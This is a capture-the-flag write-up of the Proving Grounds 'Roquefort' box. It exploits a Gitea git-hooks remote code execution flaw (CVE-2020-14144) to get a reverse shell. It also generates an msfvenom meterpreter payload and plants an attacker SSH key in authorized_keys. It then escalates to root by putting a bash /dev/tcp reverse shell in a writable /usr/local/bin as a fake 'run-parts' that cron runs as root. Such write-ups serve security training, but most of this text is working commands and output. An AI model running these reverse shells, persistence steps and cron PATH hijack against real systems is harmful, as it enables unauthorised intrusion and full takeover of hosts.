### Roquefort Proving Ground Practice

### Difficulty = Hard

### IP Address = 192.168.88.67

Nmap Scan: 

```                                                                                                                                                                                                               
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Exghost]
└─$ nmap -sCV -A 192.18.8867 -p21,22,2222,3000 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 22:13 WAT
Nmap scan report for 192.18.8867 (192.18.34.163)
Host is up.

PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   filtered ssh
2222/tcp filtered EtherNetIP-1
3000/tcp filtered ppp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.48 seconds
```

Wow nothing of interest cause the ports are filtered

Attempting to connect to ftp shows the ftp version

```
┌──(markhaxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ ftp 192.168.88.67
Connected to 192.168.88.67.
220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.88.67]
Name (192.168.88.67:mark): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed
ftp> ^D
221 Goodbye.
```

Searching for known exploits on ProFTPD 1.3.5b

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ searchsploit proftpd 1.3.5 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                        | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                              | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                                          | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                                                        | linux/remote/36742.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                   
```

Well non of it actually turns out to be working for that version of ftp in it

Lets check out other ports 22, 2222 & 3000

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ nc 192.168.88.67 22  
SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
^C
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ nc 192.168.88.67 2222
SSH-2.0-dropbear_2016.74
|8?4n>Aqicurve25519-sha256@libssh.org,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,kexguess2@matt.ucc.asn.au#ecdsa-sha2-nistp521,ssh-rsa,ssh-dssgaes128-ctr,aes256-ctr,aes128-cbc,aes256-cbc,twofish256-cbc,twofish-cbc,twofish128-cbc,3des-ctr,3des-cbcgaes128-ctr,aes256-ctr,aes128-cbc,aes256-cbc,twofish256-cbc,twofish-cbc,twofish128-cbc,3des-ctr,3des-cbc;hmac-sha1-96,hmac-sha1,hmac-sha2-256,hmac-sha2-512,hmac-md5;hmac-sha1-96,hmac-sha1,hmac-sha2-256,hmac-sha2-512,hmac-md5zlib@openssh.com,nonezlib@openssh.com,noneo^C
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ nc 192.168.88.67 3000
GET / 
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request                                                                                                                                                                                                                   
```

So only port 3000 thats a web server the remaining 22 & 2222 are ssh server 

Lets hit the web server then :)

And its a gitea instance 
![image](https://user-images.githubusercontent.com/113513376/213887762-2a62f2ac-0602-431d-a9a7-c578690a4ed1.png)

Below the page shows the gitea version which is 1.7.5 
![image](https://user-images.githubusercontent.com/113513376/213887836-839434f2-7531-4a44-8396-abd184ece9e1.png)

Hitting google is there's known exploit returns this but its an authenticated rce https://www.exploit-db.com/exploits/49383
![image](https://user-images.githubusercontent.com/113513376/213887850-36539630-861f-4b08-bb91-a1d59766b08d.png)

At this point we don't have credential 

So lets check out other things

I tried loggin in with username admin with different weak credentials but it failed 
![image](https://user-images.githubusercontent.com/113513376/213887879-3922fd81-bbaa-4479-99b1-c5209dc01c20.png)

So rather lets create an account and see what we can get from exploring repository there
![image](https://user-images.githubusercontent.com/113513376/213887907-b49461db-ad6c-40ff-96cf-2895a781ee0a.png)

```
Username: hacker
Email: hacker@localhost.com
Password: hacker
Re-Type Password: hacker
```

It worked
![image](https://user-images.githubusercontent.com/113513376/213887963-c87992a7-ae17-49c2-b352-eac2758b529a.png)

So i just taught of something right now 

Instead of attempting to explore possible repository 

We can instead use the credential on the exploit 🙂

Now i just need to edit the required variables
![image](https://user-images.githubusercontent.com/113513376/213888032-ea6e6187-fd38-4276-ab0a-92b95539b337.png)


So we need to set a python web server on port 8080 which has a file called shell that will grant us a reverse shell 

But instead i'll replace the command to run with a reverse shell 
![image](https://user-images.githubusercontent.com/113513376/213892661-9bd0fa98-cda3-48f0-92dd-fae7cdf173fd.png)

Now lets give the exploit a run 

On running the exploit

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ python3 exploit.py
Logging in
Logged in successfully
Retrieving user ID
Retrieved user ID: 1
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /tmp/tmpcrfhzvs5/.git/
[master (root-commit) ce31572] x
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 x
Cloning into bare repository '/tmp/tmpcrfhzvs5.git'...
done.
Created temporary git server to host /tmp/tmpcrfhzvs5.git
Creating repository
Repo "dxwawnku" created
Injecting command into repo
Error injecting command
```

It doesn't work maybe it surely does require the main method

So i'll give it what it wants then 
![image](https://user-images.githubusercontent.com/113513376/213893627-2662c263-5c39-4ee7-a2e8-b07b3d390a37.png)

Now i'll create a binary which will give a reverse shell 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.49.88 LPORT=3000 -o shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Saved as: shell
```

To save time i'll just say that i wasn't able to get it work using this particular exploit :(

So i checked again for another exploit and found another one https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce
![image](https://user-images.githubusercontent.com/113513376/213894227-21c8f4d9-89d2-4817-b598-85c6afc23bfd.png)


Now trying it out we see what it requires

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]                                                                                                                                                                   
└─$ python3 hook.py                                                                                                                                                                                                
    _____ _ _______                                                                                                                                                                                                
   / ____(_)__   __|             CVE-2020-14144                                                                                                                                                                    
  | |  __ _   | | ___  __ _                                                                                                                                                                                        
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution                                                                                                                                               
  | |__| | |  | |  __/ (_| |                                                                                                                                                                                       
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5                                                                                                                                              
                                                                                                                                                                                                                   
usage: hook.py [-h] [-v] -t TARGET -u USERNAME -p PASSWORD [-I REV_IP] [-P REV_PORT] [-f PAYLOAD_FILE]                                                                                                             
hook.py: error: the following arguments are required: -t/--target, -u/--username, -p/--password                                                           
```

Now lets put the arguments and run it again

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ python3 hook.py -t http://192.168.88.67:3000 -u hacker -p hacker -I 192.168.49.88 -P 3000 
    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5
     
[+] Starting exploit ...
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /tmp/tmp.BCsmynrkd5/.git/
[master (root-commit) 6966259] Initial commit
 1 file changed, 1 insertion(+)
 create mode 100644 README.md
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 249 bytes | 124.00 KiB/s, done.
[+] Exploit completed !
```
 
 It shows exploit completed 
 
 Now back on the listener
 
 ```
 ┌──(mark__haxor)-[~]
└─$ nc -lvnp 3000
listening on [any] 3000 ...
connect to [192.168.49.88] from (UNKNOWN) [192.168.88.67] 46776
bash: cannot set terminal process group (745): Inappropriate ioctl for device
bash: no job control in this shell
chloe@roquefort:~/gitea-repositories/hacker/vuln.git$ 

chloe@roquefort:~/gitea-repositories/hacker/vuln.git$   
```

So we need to stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg 
reset
```

Also i was able to exploit it manually

By adding a new repo then changing the content of post-receive in git hook to a reverse shell
![image](https://user-images.githubusercontent.com/113513376/213894398-443fe977-ffb8-4933-b756-6ef257ffd4c4.png)
![image](https://user-images.githubusercontent.com/113513376/213894409-e32bfde1-9a09-4055-a6ab-d4a62d031807.png)

Now navigating to settings
![image](https://user-images.githubusercontent.com/113513376/213894431-424343dd-b862-422e-a272-1ee9f948424a.png)

Head on to Git Hook
![image](https://user-images.githubusercontent.com/113513376/213894443-3d30003a-8177-4639-816c-610295956e87.png)

Select post-receive to edit then put a bash reverse shell
![image](https://user-images.githubusercontent.com/113513376/213894468-bcd55006-eb6f-42b7-af3b-6368a5d9c52f.png)

Update the hook

Now back to the shell repo
![image](https://user-images.githubusercontent.com/113513376/213894490-8da6f667-f20d-47a5-80cd-ef17a21a2feb.png)

And we need to cause a commit to be made for the hook to activate

So i'll follow the command

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ touch README.md          
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ git init                 
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /home/mark/Desktop/B2B/Pg/Practice/Roguefort/.git/
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ git add README.md
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ git commit -m "pwn3d"    
[master (root-commit) 80c1674] pwn3d
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 README.md
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ git remote add origin http://192.168.88.67:3000/hacker/shell.git
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ git push -u origin master                                       
Username for 'http://192.168.88.67:3000': hacker
Password for 'http://hacker@192.168.88.67:3000': 
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 212 bytes | 21.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0

```

After this it hangs

But back on the listener

```                                                      
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ nc -lvnp 3000
listening on [any] 3000 ...
connect to [192.168.49.88] from (UNKNOWN) [192.168.88.67] 46794
bash: cannot set terminal process group (745): Inappropriate ioctl for device
bash: no job control in this shell
chloe@roquefort:~/gitea-repositories/hacker/shell.git$ 
```

Cool it works xD

Anyways lets get root

I need a more comfortable shell

And since we're user chloe i can generate ssh key then login via the id_rsa file

```
chloe@roquefort:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/chloe/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/chloe/.ssh/id_rsa.
Your public key has been saved in /home/chloe/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:zQVZFkiqE40mlgoL6JVeHUNGr1bliqndAflmwEewEBI chloe@roquefort
The key's randomart image is:
+---[RSA 2048]----+
|   E.o+B.oo=+.   |
|.   o.=oB.=o     |
|+  o+.+Bo+ ..    |
|oooo.o oXo..     |
|....  o=S*o      |
|      +.+ .      |
|     . . .       |
|                 |
|                 |
+----[SHA256]-----+
chloe@roquefort:~$ cd .ssh
chloe@roquefort:~/.ssh$ ls -al
total 16
drwx------ 2 chloe chloe 4096 Jan 21 18:53 .
drwxr-xr-x 4 chloe chloe 4096 Jan 21 18:16 ..
-rw------- 1 chloe chloe 1679 Jan 21 18:53 id_rsa
-rw-r--r-- 1 chloe chloe  397 Jan 21 18:53 id_rsa.pub
chloe@roquefort:~/.ssh$ 
```

Now i tried loggin in 

```
                                                                                                                                                                                                                  
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ nano idrsa
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ chmod 600 idrsa
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Roguefort]
└─$ ssh -i idrsa chloe@192.168.88.67
chloe@192.168.88.67's password: 
```

But it failed 

But we can also write out own id_rsa.pub into the user's .ssh/authorized_keys

So lets generate our own pair using ssh-keygen

```
┌──(mark__haxor)-[~]
└─$ ssh-keygen                      
Generating public/private rsa key pair.
Enter file in which to save the key (/home/mark/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/mark/.ssh/id_rsa
Your public key has been saved in /home/mark/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:Da/ekbvVrhWbfVtlaMBnOt89j9IptKHLpTJ0cydnEBQ mark@haxor
The key's randomart image is:
+---[RSA 3072]----+
|           .E.   |
|           ..    |
|        .   o.o  |
|         +  .= . |
|        S o o.+ o|
|        ..o.==+Bo|
|       ...o=oO*o*|
|       .oo.*+oo.*|
|        .oBo.+o..|
+----[SHA256]-----+
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~]
└─$ cd .ssh
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/.ssh]
└─$ l
id_rsa  id_rsa.pub
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/.ssh]
└─$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+v9KjdAD6ipWpFUKPh2t7yEE/pm/2sJJMXRPLwPelFOEyhxeaslj2FF322hsWme0kBbWnyU6NeM3TV4sxKIPITFni2HJLMcamaSdvH4N5HCfxBHlkEGBvWzzQz/SYbrv4BwuuyTPTwMA6hwQ32L+XtBDZwxEfowwr2weI8RgIWXFvwngrUOej9pYUO6ZIWxp3xJZ9TIChwtBxClodcla4eiMLCbXzzSuS1Bt2Q/79CHT0p97ydsuy+IiFN7nvJLP90yYzMIuVK1FB/x4nXpHPiVnTDX87agGif70OOOru+2sp3F/R2slpSeM+vlJidHrV2yHi3RAdZlE4od/dvHGJM6qJJleRfR6p6m7I67UHax4z0m8aQOJ8GGHXJm7+HGuThi+2tLVy5RauiSe1s94TmqrZLT9S9NO+3sJYEclBGP0dR22XUYyURXkKNVefr01Ia3qR2ptMwJkf4ijolWuLvkeU2WaPT6wxCpNjHEXsZqmvS7IiIiLsNKrDXtf/cn0= mark@haxor
```

Now we do this 

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+v9KjdAD6ipWpFUKPh2t7yEE/pm/2sJJMXRPLwPelFOEyhxeaslj2FF322hsWme0kBbWnyU6NeM3TV4sxKIPITFni2HJLMcamaSdvH4N5HCfxBHlkEGBvWzzQz/SYbrv4BwuuyTPTwMA6hwQ32L+XtBDZwxEfowwr2weI8RgIWXFvwngrUOej9pYUO6ZIWxp3xJZ9TIChwtBxClodcla4eiMLCbXzzSuS1Bt2Q/79CHT0p97ydsuy+IiFN7nvJLP90yYzMIuVK1FB/x4nXpHPiVnTDX87agGif70OOOru+2sp3F/R2slpSeM+vlJidHrV2yHi3RAdZlE4od/dvHGJM6qJJleRfR6p6m7I67UHax4z0m8aQOJ8GGHXJm7+HGuThi+2tLVy5RauiSe1s94TmqrZLT9S9NO+3sJYEclBGP0dR22XUYyURXkKNVefr01Ia3qR2ptMwJkf4ijolWuLvkeU2WaPT6wxCpNjHEXsZqmvS7IiIiLsNKrDXtf/cn0= mark@haxor" > /home/chloe/.ssh/authorized_keys
```

Lets confirm if its there

```
chloe@roquefort:~$ cd .ssh
chloe@roquefort:~/.ssh$ ls -al
total 20
drwx------ 2 chloe chloe 4096 Jan 21 18:59 .
drwxr-xr-x 4 chloe chloe 4096 Jan 21 18:16 ..
-rw-r--r-- 1 chloe chloe  564 Jan 21 18:59 authorized_keys
-rw------- 1 chloe chloe 1679 Jan 21 18:53 id_rsa
-rw-r--r-- 1 chloe chloe  397 Jan 21 18:53 id_rsa.pub
chloe@roquefort:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+v9KjdAD6ipWpFUKPh2t7yEE/pm/2sJJMXRPLwPelFOEyhxeaslj2FF322hsWme0kBbWnyU6NeM3TV4sxKIPITFni2HJLMcamaSdvH4N5HCfxBHlkEGBvWzzQz/SYbrv4BwuuyTPTwMA6hwQ32L+XtBDZwxEfowwr2weI8RgIWXFvwngrUOej9pYUO6ZIWxp3xJZ9TIChwtBxClodcla4eiMLCbXzzSuS1Bt2Q/79CHT0p97ydsuy+IiFN7nvJLP90yYzMIuVK1FB/x4nXpHPiVnTDX87agGif70OOOru+2sp3F/R2slpSeM+vlJidHrV2yHi3RAdZlE4od/dvHGJM6qJJleRfR6p6m7I67UHax4z0m8aQOJ8GGHXJm7+HGuThi+2tLVy5RauiSe1s94TmqrZLT9S9NO+3sJYEclBGP0dR22XUYyURXkKNVefr01Ia3qR2ptMwJkf4ijolWuLvkeU2WaPT6wxCpNjHEXsZqmvS7IiIiLsNKrDXtf/cn0= mark@haxor
chloe@roquefort:~/.ssh$ chmod 700 authorized_keys 
chloe@roquefort:~/.ssh$ 
```

Now lets try loggin as chloe but this time without no password or ssh key

```
┌──(mark__haxor)-[~/.ssh]
└─$ ssh chloe@192.168.88.67 
The authenticity of host '192.168.88.67 (192.168.88.67)' can't be established.
ED25519 key fingerprint is SHA256:KLDrKMoM1ofgOq5STWDzt3FmA9tfUU303c5AWrr2IuY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.88.67' (ED25519) to the list of known hosts.
Linux roquefort 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
chloe@roquefort:~$ 
```

Now lets escalate privilege

I'll upload linpeas.sh and pspy to the target 

I'll host the python web server on port 3000 

Cause pg box doesn't really allow outbound connection from ports that aren't open in the system

```
chloe@roquefort:~$ wget 192.168.49.88/pspy
--2023-01-21 19:04:15--  http://192.168.49.88/pspy
Connecting to 192.168.49.88:80... ^C
chloe@roquefort:~$ wget 192.168.49.88:3000/pspy
--2023-01-21 19:04:46--  http://192.168.49.88:3000/pspy
Connecting to 192.168.49.88:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: _pspy_

pspy                                                 100%[=====================================================================================================================>]   2.94M   554KB/s    in 9.4s    

2023-01-21 19:04:55 (321 KB/s) - _pspy_ saved [3078592/3078592]

chloe@roquefort:~$ wget 192.168.49.88:3000/linpeas.sh
--2023-01-21 19:06:24--  http://192.168.49.88:3000/linpeas.sh
Connecting to 192.168.49.88:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827827 (808K) [text/x-sh]
Saving to: _linpeas.sh_

linpeas.sh                                           100%[=====================================================================================================================>] 808.42K   373KB/s    in 2.2s    

2023-01-21 19:06:26 (373 KB/s) - _linpeas.sh_ saved [827827/827827]

chloe@roquefort:~$ chmod +x linpeas.sh pspy 
chloe@roquefort:~$ 
```

From running linpeas it showed we had access to write any binary in the /usr/local/bin path

```
┌──────────┤ Systemd PATH                                                                                                                                                                                          
└ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                                                     
PATH=/usr/local/sbin:`/usr/local/bin`:/usr/sbin:/usr/bin:/sbin:/bin   
```

Ok cool but how can we take advantage of this 

There's not really anything we can do like we can't hijack any binary or sth 

So we need to find something that would probably call from that path so we can then hijack it

And from pspy i got this

```
2023/01/21 19:15:01 CMD: UID=0    PID=29901  | /usr/sbin/CRON -f 
2023/01/21 19:15:01 CMD: UID=0    PID=29902  | /usr/sbin/CRON -f 
2023/01/21 19:15:01 CMD: UID=0    PID=29903  | run-parts --report /etc/cron.hourly 
```

We see a cron is running cool lets check out what is been called when cron runs 

```
chloe@roquefort:/usr/local/bin$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

We see the path we have access is been listed in the crontab 

Now lets exploit this

I'll create a bash reverse shell file and put in /usr/local/bin which will also be renamed to run-parts cause thats what being called when cron runs

So when cron runs we get a shell

```
chloe@roquefort:/usr/local/bin$ nano shell.sh
chloe@roquefort:/usr/local/bin$ chmod +x shell.sh 
chloe@roquefort:/usr/local/bin$ cat shell.sh 
#!/bin/bash

/bin/bash -i >& /dev/tcp/192.168.49.88/22 0>&1
chloe@roquefort:/usr/local/bin$ mv shell.sh run-parts
chloe@roquefort:/usr/local/bin$ ls
gitea  run-parts
```

And after waiting for some while i get shell as root 

```
┌──(mark__haxor)-[~/Desktop/Scripts]
└─$ nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.49.88] from (UNKNOWN) [192.168.88.67] 43592
bash: cannot set terminal process group (29958): Inappropriate ioctl for device
bash: no job control in this shell
root@roquefort:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@roquefort:/# cd /root
cd /root
root@roquefort:~# ls -al
ls -al
total 20
drwx------  2 root root 4096 Jan 21 18:11 .
drwxr-xr-x 22 root root 4096 Apr 24  2020 ..
-rw-------  1 root root    0 Jul 28  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Jan 21 18:12 proof.txt
```

And we're done xD

<br> <br>
[Back To Home](../../index.md)
<br>










